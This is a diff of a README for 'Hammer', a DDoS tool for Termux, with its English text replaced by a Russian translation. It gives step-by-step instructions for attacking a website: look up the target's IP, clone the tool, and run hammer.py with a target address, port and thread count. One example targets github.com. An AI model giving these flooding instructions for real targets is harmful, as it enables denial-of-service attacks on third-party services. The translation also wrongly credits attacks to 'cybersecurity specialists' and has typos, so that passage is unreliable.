@@ -1,29 +1,31 @@
 # Hammer
-Ddos attack tool for termux
-*What is ddos attack*
-That is what a Distributed Denial of Service (DDoS) attack is—a method where cybercriminals flood a network with so much traffic that it cannot operate or communicate as it normally would. ... All it takes to create a DDoS attack are two devices that coordinate to send fake traffic to a server or website. That's it.
+Инструмент для проведения DDoS-атани при помощи Termux.
 
-# What are ddos attack used for
-Distributed denial of service (DDoS) attacks are a subclass of denial of service (DoS) attacks. A DDoS attack involves multiple connected online devices, collectively known as a botnet, which are used to overwhelm a target website with fake traffic.
+    Termux - Эмулятор терминала для Андроид устройств.
 
-# ddos attack tool
+*Что такое DDoS-атака?*
+Это распределённая атака типа "отказ в обслуживании" - это метод при котором специалисты в области кибербезопасности заполняют сеть большим количеством трафика, до такой степени, что информационная система перестают работать или обмениваться данными, как обычно. Всё, что требуется для создания DDoS-атаки, - это два устройства, которые поординируют отправку поддельного трафика на сервер или веб-сайт. 
+
+# Что такое DDoS атака и для чего используется
+Distributed Denial Of Service (DDoS)- распределённая атака типа "отказ в обслуживании". DDoS-атака выполняется с нескольких онлайн-устройст, известных как "ботнет", которые используются для перегрузки целевого веб-сайта, посредством осуществления множественных запросов к целевому ресурсу.
+
+# инструмент для ddos атаки
 *Hammer*
 
-Hammer need the Name Server of a website which you want to attack...
-To get the Name Server...just type
-$ nslookup example.com
-Note the IP Address of that Website
+Hammer требует 'Имя Сервера' веб-сайта, который вы решили атаковать...
+Для того, чтобы получить имя сервера, просто введите: 
+* $ nslookup example.com
 
-then
+Обратите внимание на IP-адрес веб-сайта
+
 > cd Hammer
 
-> python hammer.py -s [ip Address] -t 135
-example:
+> python hammer.py -s [IP-адрес] -p 80 -t 135
 
-> python hammer.py -s 123.45.67.89 -t 135
+> Пример: python hammer.py -s 123.45.102.1 -p 80 -t 135
 
 
-# Installation
+# Инструкция по применению
 ```pkg update && pkg upgrade
 
 git clone https://github.com/EpluribusNEO/Hammer.git
@@ -32,11 +34,10 @@ cd Hammer
 
 python hammer.py
 ```
-# Usage:
-> python hammer.py -s [IP address] -t 135
+# Как использовать:
+> python hammer.py -s [IP адрес] -t 135
 
-#### example: 
+#### Пример: 
 * python hammer.py -s 127.0.0.1 -p 80 -t 135
 * python hammer.py -s github.com -p 443 -t 135
 
-=============================
